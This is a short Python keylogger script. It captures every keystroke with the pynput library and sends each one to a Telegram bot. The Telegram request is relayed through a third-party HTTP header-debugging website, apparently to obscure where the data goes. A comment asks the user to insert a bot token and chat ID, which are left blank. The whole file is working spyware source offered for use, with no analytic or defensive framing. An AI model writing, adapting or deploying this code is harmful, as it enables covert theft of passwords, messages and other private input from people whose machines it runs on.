import requests
import sys
from pynput import keyboard

def run_key_log():
    with keyboard.Listener(on_press= keys_log) as listen:
        listen.join()
            
    
def keys_log(key):
    K_log = str(key)
    if K_log == "Key.space":
        K_log = '----------------------------'
    elif K_log == "Key.esc":
        sys.exit()
    try:
        make_MES(K_log)
    except:
        print("You must apply the changes to the tool")

def make_MES(messege):
    try:
        #set your tocken & chat ID
        pm = str(messege)
        sending_url = ("https://api.telegram.org/                                    /sendmessage?chat_id=            &text="+pm)


        #data///
        Datadic = {"UrlBox" : sending_url,
            "AgentList": "Mozilla Firefox",
            "VersionsList": "HTTP/1.1",
            "MethodList": "GET"
                }

        # "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx"

        requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", data = Datadic)
    except:
        print("Requests Not found chek problem")
    
    
try:
    run_key_log()
except:
    print("ERROR")
